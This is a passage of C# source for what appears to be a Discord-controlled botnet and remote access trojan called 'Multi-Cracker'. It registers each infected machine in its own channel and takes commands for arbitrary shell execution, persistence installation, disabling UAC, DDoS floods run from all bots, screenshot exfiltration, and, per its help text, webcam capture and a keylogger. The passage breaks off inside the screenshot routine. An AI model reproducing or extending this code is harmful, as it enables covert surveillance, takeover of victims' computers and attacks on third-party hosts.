                    // Find the argument after !cmd
                    string argument = trimmedContent.Substring(5);

                    // Execute command with cmd and return the output
                    string output = ExecuteCommand(argument);

                    // Send discord message
                    await message.Channel.SendMessageAsync($"Output: {output}");
                }
                // DEBUG
                else if (trimmedContent == "!log")
                {
                    try
                    {
                        string log = txtOutput.Text;
                        string fullPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "log.txt");
                        File.WriteAllText(fullPath, log);
                        // Send the file (NOT AS NORMAL TEXT)
                        await message.Channel.SendFileAsync(fullPath);

                        Log(new LogMessage(LogSeverity.Info, "Message", $"Sent log file to C2."));
                        // Remove log
                        File.Delete(fullPath);
                    }
                    catch (Exception ex)
                    {
                        // Send discord message
                        await message.Channel.SendMessageAsync($"Error sending log file: {ex.Message}");
                        // Log
                        Log(new LogMessage(LogSeverity.Error, "Message", $"Error sending log file: {ex.Message}"));
                    }
                }
                else if (trimmedContent.StartsWith("!check"))
                {
                    // Find the argument after !check
                    string hashTarget = trimmedContent.Substring(7);

                    // Use SearchForArguments to find the argument
                    string output = SearchForArguments(hashTarget);

                    if (output == "found")
                    {
                        // Password was found and hash:password was sent to discord channel.
                        return;
                    }
                    else if (output == "not found")
                    {
                        // Hash was not found.
                        // Send discord message
                        await message.Channel.SendMessageAsync($"Did not find the hash in \"forces\": **{hashTarget}**");
                        return;
                    }

                    // Split output by ":"
                    string[] outputSplit = output.Split(":");
                    bool found = Convert.ToBoolean(outputSplit[0]);
                    string hashFound = outputSplit[1];
                    string startCommand = outputSplit[2];
                    BigInteger combinations = Convert.ToInt32(outputSplit[3]);

                    // EXAMPLE OUTPUT: "True:<hash>:<startCommand>:<TotalCombinations>"

                    // Send discord message (Passwords left to crack: True)
                    await message.Channel.SendMessageAsync($"Passwords left to crack: **{found}**");
                    // Send discord message (Hash: <hash>)
                    await message.Channel.SendMessageAsync($"Checked hash: **{hashFound}**");
                    if (found)
                    {
                        // Send discord message (Start command: <startCommand>)
                        await message.Channel.SendMessageAsync($"Start command: **{startCommand}** (Based on that the password is within {combinations} combinations long.)");
                    }
                }
                else if (trimmedContent == "!auto")
                {
                    // Update the auto settings
                    updateAutoSettings();
                    // Send all Auto settings in one message
                    await message.Channel.SendMessageAsync($"Auto settings:\r\nHash: **{AutoHash}**\r\nAlgorithm: **{AutoAlgorithm}**\r\nUseNumbers: **{AutoUseNumbers}**\r\nUseLetters: **{AutoUseLetters}**\r\nUseSymbols: **{AutoUseSymbols}**\r\nUseCapitals: **{AutoUseCapitals}**\r\nMaxLength: **{AutoMaxLength}**\r\nMinLength: **{AutoMinLength}**\r\nForcesSS: **{AutoForcesSS}**");
                    findAndSelectAutoSplit();
                    // Send discord message
                    await message.Channel.SendMessageAsync($"Auto cracking started... (should at least...)");
                }
                else if (trimmedContent.StartsWith("!createAuto"))
                {
                    // Find the argument after !createAuto
                    string argument = trimmedContent.Substring(12);

                    if (BigInteger.TryParse(argument, out BigInteger splitingAmounts))
                    {
                        // Create a new auto-target with current settings and split the combinations "splitingAmounts" (int) times and send the settings to "splits" and "settings"

                        // Calculate the number of combinations
                        BigInteger combinations = CalculateCombinations(UseNumbers, UseLetters, UseSymbols, UseCapitals, MaxLength, MinLength);
                        Log(new LogMessage(LogSeverity.Info, "Auto Creation", "Number of combinations: " + combinations));

                        // Split the combinations "splitingAmounts" (int) times
                        BigInteger combinationsPerSplit = combinations / splitingAmounts;
                        Log(new LogMessage(LogSeverity.Info, "Auto Creation", "Number of combinations per split: " + combinationsPerSplit));

                        // Generate a forcesSS (<start1>,<end1>;<start2>,<end2>;<start3>,<end3>) based on the number of splits
                        string forcesSS = "";
                        for (BigInteger i = 0; i < splitingAmounts; i++)
                        {
                            // Calculate the start and end
                            BigInteger start = i * combinationsPerSplit;
                            BigInteger end = (i + 1) * combinationsPerSplit;

                            // Add the start and end to forcesSS
                            forcesSS += $"{start},{end};";
                        }

                        // Remove the last ";" from forcesSS
                        forcesSS = forcesSS.Remove(forcesSS.Length - 1);

                        // Find channel "settings" and send the settings
                        guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
                        channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"settings");
                        // Send the settings (<hash>:<algorithm>:<useNumbers>:<useLetters>:<useSymbols>:<useCapitals>:<Max>:<Min>)
                        await channel.SendMessageAsync($"{hash}:{Algorithm}:{UseNumbers}:{UseLetters}:{UseSymbols}:{UseCapitals}:{MaxLength}:{MinLength}");

                        // Find channel "splits" and send the settings
                        guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
                        channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"splits");
                        // Try sending the settings (<forcesSS>)
                        try
                        {
                            channel.SendMessageAsync($"{forcesSS}");
                        }
                        catch (Exception ex)
                        {
                            // Send discord message
                            await message.Channel.SendMessageAsync($"Too many splits, it exceeds the maximum of 2000 characters. Please use less splits.");
                            // Log
                            Log(new LogMessage(LogSeverity.Error, "Message", $"Error sending forcesSS: {ex.Message}"));
                        }
                        
                        

                        // Send Discord message (Created auto-target with {splitingAmounts} splits)
                        await message.Channel.SendMessageAsync($"Created auto-target with **{splitingAmounts}** splits.");

                        // Send discord message
                        await message.Channel.SendMessageAsync($"If you wish to see the splits then please check the \"splits\" channel. #splits");
                    }
                    else
                    {
                        // Handle the case where the conversion fails
                        // Log
                        Log(new LogMessage(LogSeverity.Error, "Auto Creation", $"Failed to convert {argument} to BigInteger."));
                    }
                }
                // PERSISTENCE
                else if (trimmedContent == "!install")
                {
                    InstallPersistence();
                }
                else if (trimmedContent == "!uninstall")
                {
                    // Using registry to uninstall persistence
                    UninstallPersistence();
                }
                else if (trimmedContent == "!disableUAC")
                {
                    if (IsAdministrator())
                    {
                        message.Channel.SendMessageAsync("Client has admin...");
                        // Using registry to disable UAC
                        bool Worked = DisableUAC();
                        if (Worked)
                        {
                            message.Channel.SendMessageAsync("Successfully disabled UAC, may take a restart to disable fully.");
                        }
                        else
                        {
                            message.Channel.SendMessageAsync("An error has occured! Aborting...");
                        }
                    }
                    else
                    {
                        message.Channel.SendMessageAsync("Please elevate to admin first. (Tip: **!elevate**)");
                    }
                }
                else if (trimmedContent == "!specialInstall")
                {
                    InstallSpecialPersistence();
                }
                else if (trimmedContent == "!specialUninstall")
                {
                    UninstallSpecialPersistence();
                }
                // DDoS
                else if (trimmedContent.StartsWith("!ddos"))
                {
                    // Get the aruments (!ddos <ip> <port> <time>)
                    string argument = trimmedContent.Substring(6);
                    string[] arguments = argument.Split(" ");

                    // Check if the arguments are valid
                    if (arguments.Length == 3)
                    {
                        // Get the arguments
                        string ip = arguments[0];
                        string port = arguments[1];
                        string time = arguments[2];

                        // Send discord message
                        await message.Channel.SendMessageAsync($"Starting DDoS attack on {ip}:{port} for {time} seconds...");

                        // Start DDoS attack
                        await Task.Run(() => DDoS(ip, port, time));
                    }
                    else
                    {
                        // Send discord message
                        await message.Channel.SendMessageAsync($"Invalid arguments. Please use !ddos <ip> <port> <time>");
                    }
                }
                else if (trimmedContent.StartsWith("!allDdos"))
                {
                    // Get the aruments (!ddos <ip> <port> <time>)
                    string argument = trimmedContent.Substring(9);
                    string[] arguments = argument.Split(" ");

                    // Check if the arguments are valid
                    if (arguments.Length == 3)
                    {
                        // Get the arguments
                        string ip = arguments[0];
                        string port = arguments[1];
                        string time = arguments[2];

                        // Find all other bots (including itself)
                        computers = FindOthers();
                        // Log the active computers
                        foreach (var computer in computers)
                        {
                            // Send discord message (!crack)
                            guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
                            channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computer}");
                            await channel.SendMessageAsync($"!ddos {ip} {port} {time}");
                            Log(new LogMessage(LogSeverity.Info, "DDoS", $"Started DDoS with bot-{computer}..."));
                        }

                        // Send discord message
                        await message.Channel.SendMessageAsync($"Starting DDoS attack on {ip}:{port} with all active bots for {time} seconds...");
                    }
                    else
                    {
                        // Send discord message
                        await message.Channel.SendMessageAsync($"Invalid arguments. Please use !ddos <ip> <port> <time>");
                    }
                }
                else if (trimmedContent == "!stopddos")
                {
                    // Send discord message
                    await message.Channel.SendMessageAsync($"Stopping all DDoS attacks...");

                    // Stop DDoS attack
                    await Task.Run(() => StopDDoS());
                }
                // RAT
                else if (trimmedContent == "!rat")
                {
                    LogRAT(new LogMessage(LogSeverity.Info, "RAT", $"Received command: {trimmedContent}"));
                    // Check if the RAT is already running
                    if (RATRunning)
                    {
                        // Send discord message
                        await message.Channel.SendMessageAsync($"RAT is already running. Getting a link to it now...");

                        // Go through all channels and find the one that starts with "ratted-" and contains the computer name
                        guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
                        bool foundRAT = false;
                        foreach (var channel1 in guild.TextChannels)
                        {
                            if (channel1.Name.StartsWith("ratted-") && channel1.Name.Contains(computerName))
                            {
                                // Found the channel
                                foundRAT = true;

                                // Get a link to the channel
                                string link = channel1.CreateInviteAsync().Result.Url;

                                // Send discord message
                                await message.Channel.SendMessageAsync($"Link: {link}");
                            }
                        }
                        if (!foundRAT)
                        {
                            // Send discord message
                            await message.Channel.SendMessageAsync($"Could not find the channel. Somehow it has disappeared, restarting RAT...");

                            // Set RATRunning to false (That automatically restarts the RAT)
                            RATRunning = false;
                        }
                    }
                    else
                    {
                        // Send discord message
                        await message.Channel.SendMessageAsync($"Starting RAT...");
                        Log(new LogMessage(LogSeverity.Info, "RAT", $"Starting RAT..."));

                        // Start RAT
                        Task.Run(() => RAT());

                        // Send discord message
                        await message.Channel.SendMessageAsync($"Should have started now, look for \"ratted-{computerName}\"");
                    }
                }


                // Invalid Command
                else if (trimmedContent.StartsWith("!"))
                {
                    await message.Channel.SendMessageAsync("Invalid command. Please use **!help** for a list of commands.");
                    Log(new LogMessage(LogSeverity.Info, "Message", $"Invalid command: {trimmedContent}"));
                }
            }
            else
            {
                Log(new LogMessage(LogSeverity.Info, "Message", "Received empty or whitespace-only message."));
            }
        }
        
        private async Task CreateBotLogsChannel()
        {
            // Create new channel "bot-<computername>" in category "BOT_CATEGORY"
            try
            {
                // Find the first available guild
                var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild

                // Check if the bot is a member of any guild
                if (guild != null)
                {
                    // Find the name of computer
                    string computerNameRaw = Environment.MachineName;
                    string computerName = computerNameRaw.ToLower();
                    LogRAT(new LogMessage(LogSeverity.Info, "Discord", $"Computer name: {computerName}"));

                    // Check if category "BOT_CATEGORY" exists
                    var category = guild.CategoryChannels.FirstOrDefault(cat => cat.Name == BOT_CATEGORY);
                    if (category != null)
                    {
                        Log(new LogMessage(LogSeverity.Info, "Discord", $"Category found: {category.Name}"));

                        // Check if the channel already exists
                        var existingChannel = guild.TextChannels.FirstOrDefault(channel => channel.Name == $"bot-{computerName}");

                        if (existingChannel == null)
                        {
                            // Create the channel if it doesn't exist
                            try
                            {
                                // Attempt to create the channel in the category
                                var channel = await guild.CreateTextChannelAsync($"bot-{computerName}", properties =>
                                {
                                    properties.CategoryId = category.Id;
                                });

                                await LogRAT(new LogMessage(LogSeverity.Info, "Discord", $"Created bot-{computerName} channel."));

                                // Start heartbeat timer in a new thread
                                await TimerThreadRAT();
                            }
                            catch (Exception ex)
                            {
                                LogRAT(new LogMessage(LogSeverity.Error, "Channel Creation", $"Error creating channel: {ex.Message}"));
                            }
                        }
                        else
                        {
                            await Log(new LogMessage(LogSeverity.Info, "Discord", $"bot-{computerName} channel already exists. Deleting it."));
                            await Log(new LogMessage(LogSeverity.Info, "Discord", $"Deleting channel to remove all messages in bot-{computerName} channel..."));

                            // Remove entire channel
                            await existingChannel.DeleteAsync();

                            await Log(new LogMessage(LogSeverity.Info, "Discord", $"Deleted bot-{computerName} channel."));

                            // Create new channel in the category
                            var channel = await guild.CreateTextChannelAsync($"bot-{computerName}", properties =>
                            {
                                properties.CategoryId = category.Id;
                            });

                            await Log(new LogMessage(LogSeverity.Info, "Discord", $"Created a brand new bot-{computerName} channel."));

                            // Start heartbeat timer in a new thread
                            await TimerThread();
                        }

                        // Install persistence
                        if (NormalPersistent)
                        {
                            InstallPersistence();
                        }
                        else if (SpecialPersistent)
                        {
                            InstallSpecialPersistence();
                        }
                        else
                        {
                            // Log
                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Does not install persistence on start..."));
                        }
                        // Start autocrack cycle on startup
                        if (AutoCrack)
                        {
                            // Wait for 1 seconds
                            await Task.Delay(1000);
                            updateAutoSettings();
                            findAndSelectAutoSplit();
                        }
                    }
                    else
                    {
                        Log(new LogMessage(LogSeverity.Error, "Discord", $"Category not found."));
                        // Create the category if it doesn't exist
                        try
                        {
                            // Attempt to create the category
                            var newCategory = await guild.CreateCategoryChannelAsync(BOT_CATEGORY);
                            LogRAT(new LogMessage(LogSeverity.Info, "Discord", $"Created category: {newCategory.Name}"));

                            // Start CreateRATChannels again
                            await CreateBotLogsChannel();
                            return;
                        }
                        catch (Exception ex)
                        {
                            LogRAT(new LogMessage(LogSeverity.Error, "Category Creation", $"Error creating category: {ex.Message}"));
                        }
                    }
                }
                else
                {
                    // Handle the case where the bot is not a member of any guild
                    Log(new LogMessage(LogSeverity.Error, "Connection", "Bot is not a member of any guild."));
                }
            }
            catch (Exception ex)
            {
                // Log
                Log(new LogMessage(LogSeverity.Error, "Connection", $"Exception during bot startup: {ex}"));
            }
        }


        // RAT
        private async Task RAT()
        {
            // Check if primary token is valid
            if (ratPrimaryToken == null)
            {
                // Log
                await LogRAT(new LogMessage(LogSeverity.Error, "RAT", $"Error: Primary token is null."));
                return;
            }

            // Test the primary token with IsTokenValid bool
            bool isPrimaryValid = true;
            bool isAlternativeValid = false;
            LogRAT(new LogMessage(LogSeverity.Info, "RAT", $"Primary token is valid: {isPrimaryValid}"));
            LogRAT(new LogMessage(LogSeverity.Info, "RAT", $"Secondary token is valid: {isAlternativeValid}"));
            if (!isPrimaryValid)
            {
                // Log
                await LogRAT(new LogMessage(LogSeverity.Error, "RAT", $"Error: Primary token is not valid."));
                
                // Check if secondary token is valid
                if (ratAlternativeToken == null)
                {
                    // Log
                    await LogRAT(new LogMessage(LogSeverity.Error, "RAT", $"Error: Secondary token is null."));
                    return;
                }

                // Test the secondary token with IsTokenValid bool
                if (!isAlternativeValid)
                {
                    // Log
                    await LogRAT(new LogMessage(LogSeverity.Error, "RAT", $"Error: Secondary token is not valid."));
                    return;
                }
                else
                {
                    // Log
                    await LogRAT(new LogMessage(LogSeverity.Info, "RAT", $"Secondary token is valid."));
                }
            }

            // If the primary token is valid then use it
            if (isPrimaryValid)
            {
                // Log
                await LogRAT(new LogMessage(LogSeverity.Info, "RAT", $"Starting RAT with primary token..."));

                var ratConfig = new DiscordSocketConfig
                {
                    LogLevel = LogSeverity.Info,
                    GatewayIntents = GatewayIntents.All
                };

                _ratClient = new DiscordSocketClient(ratConfig);
                _ratClient.Log += LogRAT;

                await _ratClient.LoginAsync(TokenType.Bot, ratPrimaryToken);
                await _ratClient.StartAsync();

                _ratClient.Ready += async () =>
                {
                    await CreateRATChannels();
                };

                _ratClient.MessageReceived += HandleMessageRAT;

                // Make ratRunning true
                RATRunning = true;

                // Log
                await LogRAT(new LogMessage(LogSeverity.Info, "RAT", $"RAT started with primary token!"));
            }

        }

        private Task LogRAT(LogMessage arg)
        {
            // Handle logging (e.g., display in a TextBox)
            Invoke(new Action(() =>
            {
                txtOutput.AppendText(arg + "\r\n");
            }));

            return Task.CompletedTask;
        }

        private async Task CreateRATChannels()
        {
            // Create new channel "ratted-<computername>" in category "RAT_CATEGORY"
            try
            {
                // Find the first available guild
                var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild

                // Check if the bot is a member of any guild
                if (guild != null)
                {
                    // Find the name of computer
                    string computerNameRaw = Environment.MachineName;
                    string computerName = computerNameRaw.ToLower();
                    LogRAT(new LogMessage(LogSeverity.Info, "Discord", $"Computer name: {computerName}"));

                    // Check all channels in a category and find the category "RAT_CATEGORY"
                    var category = guild.CategoryChannels.FirstOrDefault(cat => cat.Name == RAT_CATEGORY);
                    if (category != null)
                    {
                        LogRAT(new LogMessage(LogSeverity.Info, "Discord", $"Category found: {category.Name}"));

                        // Check if the channel already exists
                        var existingChannel = guild.TextChannels.FirstOrDefault(channel => channel.Name == $"ratted-{computerName}");

                        if (existingChannel == null)
                        {
                            // Create the channel if it doesn't exist
                            try
                            {
                                // Create new channel in the category
                                var channel = await guild.CreateTextChannelAsync($"ratted-{computerName}", properties =>
                                {
                                    properties.CategoryId = category.Id;
                                });
                                
                                await LogRAT(new LogMessage(LogSeverity.Info, "Discord", $"Created ratted-{computerName} channel."));

                                // Start heartbeat timer in a new thread
                                await TimerThreadRAT();
                            }
                            catch (Exception ex)
                            {
                                LogRAT(new LogMessage(LogSeverity.Error, "Channel Creation", $"Error creating channel: {ex.Message}"));
                            }
                        }
                        else
                        {
                            await LogRAT(new LogMessage(LogSeverity.Info, "Discord", $"ratted-{computerName} channel already exists. Deleting it."));
                            await LogRAT(new LogMessage(LogSeverity.Info, "Discord", $"Deleting channel to remove all messages in ratted-{computerName} channel..."));

                            // Remove entire channel
                            await existingChannel.DeleteAsync();

                            await LogRAT(new LogMessage(LogSeverity.Info, "Discord", $"Deleted ratted-{computerName} channel."));

                            // Create new channel
                            var channel = await guild.CreateTextChannelAsync($"ratted-{computerName}", properties =>
                            {
                                properties.CategoryId = category.Id;
                            });

                            await LogRAT(new LogMessage(LogSeverity.Info, "Discord", $"Created a brand new ratted-{computerName} channel."));

                            // Start heartbeat timer in a new thread
                            await TimerThreadRAT();
                        }
                    }
                    else
                    {
                        LogRAT(new LogMessage(LogSeverity.Error, "Discord", $"Category not found."));
                        // Create the category if it doesn't exist
                        try
                        {
                            // Attempt to create the category
                            var newCategory = await guild.CreateCategoryChannelAsync(RAT_CATEGORY);
                            LogRAT(new LogMessage(LogSeverity.Info, "Discord", $"Created category: {newCategory.Name}"));

                            // Start CreateRATChannels again
                            await CreateRATChannels();
                        }
                        catch (Exception ex)
                        {
                            LogRAT(new LogMessage(LogSeverity.Error, "Category Creation", $"Error creating category: {ex.Message}"));
                        }
                    }
                }
                else
                {
                    // Handle the case where the bot is not a member of any guild
                    Log(new LogMessage(LogSeverity.Error, "Connection", "Bot is not a member of any guild."));
                }
            }
            catch (Exception ex)
            {
                // Log
                Log(new LogMessage(LogSeverity.Error, "Connection", $"Exception during bot startup: {ex}"));
            }
        }

        private async Task TimerThreadRAT()
        {
            LogRAT(new LogMessage(LogSeverity.Info, "Heartbeat", "Heartbeat started for RAT bot."));

            // Send first heartbeat
            await SendHeartbeatRAT(0);

            // Use System.Timers.Timer instead of System.Windows.Forms.Timer
            System.Timers.Timer heartbeatTimerRAT = new System.Timers.Timer();
            heartbeatTimerRAT.Interval = 30000; // Set the interval (e.g., 30 seconds)

            heartbeatTimerRAT.Elapsed += (sender, e) =>
            {
                var unused = this.ToString();
                // Check if the bot is still connected to discord
                CheckOnOthersRAT();
                // Send a heartbeat message to the discord created ratted channel
                Task.Run(async () => await SendHeartbeatRAT(currentWarningLevelRAT)); // Run in a separate thread
            };

            heartbeatTimerRAT.Start();
        }
        async Task SendHeartbeatRAT(int level)
        {
            if (!RATRunning)
            {
                // Log
                LogRAT(new LogMessage(LogSeverity.Error, "RAT", "The RAT channel is not found... Restarting RAT"));
                // Stop the RAT client
                await _ratClient.StopAsync();
                // Start the RAT client
                await RAT();

                return;
            }
            if (level == 1)
            {
                // Log (typically around 30 sec without answer)
                LogRAT(new LogMessage(LogSeverity.Info, "RAT Heartbeat", "Warning 1"));
            }
            if (level == 2)
            {
                // Log (typically around 60 sec without answer)
                LogRAT(new LogMessage(LogSeverity.Info, "RAT Heartbeat", "Warning 2"));
            }
            if (level == 3)
            {
                // Log (typically around 90 sec without answer)
                LogRAT(new LogMessage(LogSeverity.Info, "RAT Heartbeat", "Warning 3"));
            }

            LogRAT(new LogMessage(LogSeverity.Info, "RAT Heartbeat", "Sending heartbeat..."));
            try
            {
                // Send a heartbeat message to the discord created log-channel
                var guild = _ratClient.Guilds.FirstOrDefault();
                string computerNameRaw = Environment.MachineName;
                string computerName = computerNameRaw.ToLower();
                var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"ratted-{computerName}");

                if (channel != null)
                {
                    // Send message
                    if (level == 0)
                    {
                        await channel.SendMessageAsync("Heartbeat");
                    }
                    else
                    {
                        await channel.SendMessageAsync("Heartbeat (Warning " + level + ")");
                    }
                    LogRAT(new LogMessage(LogSeverity.Info, "RAT Heartbeat", "Heartbeat sent."));
                }
                else
                {
                    LogRAT(new LogMessage(LogSeverity.Error, "RAT Heartbeat", $"Error sending heartbeat. Channel not found. ({computerName})"));
                }
            }
            catch (Exception ex)
            {
                // Handle exceptions (e.g., log or display an error message)
                LogRAT(new LogMessage(LogSeverity.Error, "RAT Heartbeat", $"Error sending heartbeat: {ex.Message}"));
            }
        }

        private List<string> FindOthersRAT()
        {
            // New list of possible bots
            List<string> possibleBots = new List<string>();

            try
            {
                // Look for text channels in server that start with "bot-"
                var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
                var channels = guild.TextChannels;

                foreach (var channel in channels)
                {
                    if (channel.Name.StartsWith("ratted-"))
                    {
                        // Get the name of the computer
                        string computerNameRaw = channel.Name;
                        string computerName = computerNameRaw.Substring(7);

                        // Check if the computer name is the same as this computer
                        if (computerName != Environment.MachineName)
                        {
                            // Check if the channel has sent a heartbeat in the last 30 seconds
                            var lastMessage = channel.GetMessagesAsync(1).FlattenAsync().Result.FirstOrDefault();
                            if (lastMessage != null)
                            {
                                possibleBots.Add(computerName);
                            }
                            else
                            {
                                // No messages found in the channel
                                LogRAT(new LogMessage(LogSeverity.Error, "Discord", $"No messages found in {channel.Name}."));
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                // Catch any error
                LogRAT(new LogMessage(LogSeverity.Error, "Discord", $"Error finding other bots. {ex.Message}"));
            }

            // Return the list of active computers with a heartbeat
            return possibleBots;
        }
        private async void CheckOnOthersRAT()
        {
            // Basicly just check if the other bots have found the password
            // If they have, then stop cracking
            // If they haven't, then continue cracking
            // If there are no other bots, then continue cracking
            // If there are other bots, but they haven't sent a heartbeat in the last 90 seconds, remove bot (its dead...)
            // Also give out warnings to bots.

            // Find other bots
            computers = FindOthersRAT();
            // Log the active computers
            foreach (var computer in computers)
            {
                LogRAT(new LogMessage(LogSeverity.Info, "Discord", $"Found active computer: {computer}"));
                // Access their own channel
                var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
                var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"ratted-{computer}");
                
                // Safety check if there is any messages in the channel
                if (channel != null)
                {
                    var timeDifference = 0.0;
                    try
                    {
                        // Get the last message
                        var lastMessage = (await channel.GetMessagesAsync(1).FlattenAsync()).FirstOrDefault();

                        // Get the latest 3 messages
                        var messages = await channel.GetMessagesAsync(3).FlattenAsync();
                        // Check time difference between now and then
                    
                        timeDifference = (DateTime.UtcNow - lastMessage.Timestamp.UtcDateTime).TotalSeconds;
                        LogRAT(new LogMessage(LogSeverity.Info, "Discord", $"Time difference: {timeDifference} seconds"));
                        LogRAT(new LogMessage(LogSeverity.Info, "Discord", $"Timestamp: {lastMessage.Timestamp}"));
                        LogRAT(new LogMessage(LogSeverity.Info, "Discord", $"UtcNow: {DateTime.UtcNow}"));

                    }
                    catch (Exception ex)
                    {
                        // Catch any error
                        LogRAT(new LogMessage(LogSeverity.Error, "Discord", $"Error checking messages. {ex.Message}"));
                    }

                    if (timeDifference > 40 && timeDifference < 60)
                    {
                        currentWarningLevelRAT = 1;
                    }
                    else if (timeDifference > 60 && timeDifference < 90)
                    {
                        currentWarningLevelRAT = 2;
                    }
                    else if (timeDifference > 90)
                    {
                        currentWarningLevelRAT = 3;
                        // The channel has not sent a heartbeat in the last 90 seconds
                        LogRAT(new LogMessage(LogSeverity.Error, "Discord", $"No heartbeat found in {channel.Name}. Will now remove the channel and possible bot"));

                        // Delete channel
                        // Check if channel is the same as this computer
                        string computerNameRaw = Environment.MachineName;
                        string computerName = computerNameRaw.ToLower();
                        if (channel.Name == $"ratted-{computerName}")
                        {
                            // The channel is the same as this computer
                            // Do not delete the channel
                            LogRAT(new LogMessage(LogSeverity.Error, "Discord", $"Channel is the same as this computer. Will not delete the channel."));
                        }
                        else
                        {
                            // The channel is not the same as this computer
                            // Delete the channel
                            await channel.DeleteAsync();
                        }
                        // Reset warning level
                        currentWarningLevelRAT = 0;
                    }
                }
            }
        }

        private async Task HandleMessageRAT(SocketMessage arg)
        {
            // Ignore system messages and messages from other bots
            bool allowBotMessages = true;
            if (allowBotMessages == false)
            {
                if (arg.Author.IsBot)
                    return;
            }
            if (arg is not IUserMessage message)
                return;

            // Check if the message is from created channel
            var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
            string computerNameRaw = Environment.MachineName;
            string computerName = computerNameRaw.ToLower();
            var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"ratted-{computerName}");
            if (arg.Channel.Name != channel.Name)
            {
                // The message is not from the created channel
                return;
            }

            // Trim the message content to remove leading and trailing whitespaces
            string trimmedContent = arg.Content.Trim();
            await LogRAT(new LogMessage(LogSeverity.Info, "Message", $"Trimmed RAT message: {trimmedContent}"));

            if (!string.IsNullOrEmpty(trimmedContent))
            {
                bool isWebcamCapturing = false;

                LogRAT(new LogMessage(LogSeverity.Info, "Message", $"Received message: {trimmedContent}"));
                // BASIC
                if (trimmedContent == "!help")
                {
                    string Help_Message = $"Hello! Here are my commands for RAT part of Multi-Cracker! (Version: **{currentVersion}**)\r\n";
                    // BASIC
                    Help_Message += "\r\n**------------------- BASIC -------------------**\r\n";
                    Help_Message += $"**!help** - Shows this message.\r\n";
                    Help_Message += $"**!kys** - Kills the RAT.\r\n";
                    // SURVEILLANCE
                    Help_Message += "\r\n**------------------- SURVENILLANCE -------------------**\r\n";
                    Help_Message += $"**!screenshot** - Takes a screenshot of the screen.\r\n";
                    Help_Message += $"**!webcam** - Takes a picture with the webcam.\r\n";
                    // KEYLOGGER
                    Help_Message += "\r\n**------------------- KEYLOGGER -------------------**\r\n";
                    Help_Message += $"**!keylogger start** - Starts the keylogger.\r\n";
                    Help_Message += $"**!keylogger stop** - Stops the keylogger.\r\n";
                    Help_Message += $"**!keylogger dump** - Dumps the keylogger log.\r\n";
                    // EXECUTION
                    Help_Message += "\r\n**------------------- EXECUTION -------------------**\r\n";
                    Help_Message += $"**!cmd <command>** - Executes a command on the bot.\r\n";
                    Help_Message += $"**!interactive-cmd** - Downloads a file from the bot.\r\n";
                    Help_Message += $"**!elevate** - Elevates the bot to admin.\r\n";
                    // FILE SYSTEM
                    Help_Message += "\r\n**------------------- FILE SYSTEM -------------------**\r\n";
                    Help_Message += $"**!upload <DISCORD ATTACHMENT> <Folder\\of\\uploaded\\file>** - Uploads a file to the bot.\r\n";
                    Help_Message += $"**!download <filename>** - Downloads a file from the bot.\r\n";
                    // RECOVERY
                    Help_Message += "\r\n**------------------- RECOVERY -------------------**\r\n";
                    Help_Message += "** WILL ADD COMMANDS HERE LATER **\r\n";
                    // OTHER
                    Help_Message += "\r\n**------------------- OTHER -------------------**\r\n";
                    Help_Message += $"**!log** - Sends the log file to the C2.\r\n";
                    await message.Channel.SendMessageAsync(Help_Message);
                }
                else if (trimmedContent == "!kys")
                {
                    // Send discord message
                    await message.Channel.SendMessageAsync($"Killing bot...");
                    LogRAT(new LogMessage(LogSeverity.Info, "Message", $"Killing bot..."));
                    // Remove the channel
                    await channel.DeleteAsync();
                    // Stop the RAT client
                    await _ratClient.StopAsync();
                    // Stop the bot (Variable)
                    RATRunning = false;
                }
                // SURVEILLANCE
                else if (trimmedContent == "!screenshot")
                {
                    try
                    {
                        // Get the bounds of the virtual screen (all monitors combined)
                        Rectangle totalBounds = SystemInformation.VirtualScreen;

                        // Make variables for how many screens there are
                        int screenCount = Screen.AllScreens.Length;
                        // Log
                        LogRAT(new LogMessage(LogSeverity.Info, "Screenshot", $"Number of screens: {screenCount}"));

                        // If there is only one screen
                        if (screenCount == 1)
                        {
                            // Take a screenshot of entire screen
                            try
                            {
                                int width, height;
                                using (var g = Graphics.FromHwnd(IntPtr.Zero))
                                {
                                    var hDC = g.GetHdc();
                                    width = GetDeviceCaps(hDC, DESKTOPHORZRES);
                                    height = GetDeviceCaps(hDC, DESKTOPVERTRES);
                                    g.ReleaseHdc(hDC);
                                }

                                // Create path to the file (current folder + filename)
                                string path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "ScreenCapture.jpg");

                                // Take screenshot and save
                                using (var img = new Bitmap(width, height))
                                {
                                    using (var g = Graphics.FromImage(img))
                                    {
                                        g.CopyFromScreen(0, 0, 0, 0, img.Size);
                                    }
                                    img.Save(path, System.Drawing.Imaging.ImageFormat.Jpeg);
                                }

                                // Find path to the file
                                string filePath = Path.GetFullPath(path);

                                // Send the file (NOT AS NORMAL TEXT)
                                await message.Channel.SendFileAsync(path)
                                    .ContinueWith(task =>
                                    {
                                        if (task.Exception != null)
                                        {
                                            // Handle exception from SendFileAsync
                                            LogRAT(new LogMessage(LogSeverity.Error, "Screenshot", $"Error sending file: {task.Exception.Message}"));
                                        }
                                        else
                                        {
                                            // Log success
                                            LogRAT(new LogMessage(LogSeverity.Info, "Screenshot", "Screenshot taken and uploaded to Discord."));
                                        }
                                    });
                            }
                            catch (Exception ex)
                            {
                                MessageBox.Show(ex.Message);
                            }
                        }
                        else
                        {
                            // Take a screenshot covering all screens with specified pixel format
                            using (var screenshot = new Bitmap(totalBounds.Width, totalBounds.Height, PixelFormat.Format32bppArgb))
                            using (var gfxScreenshot = Graphics.FromImage(screenshot))
                            {
                                // Capture the virtual screen
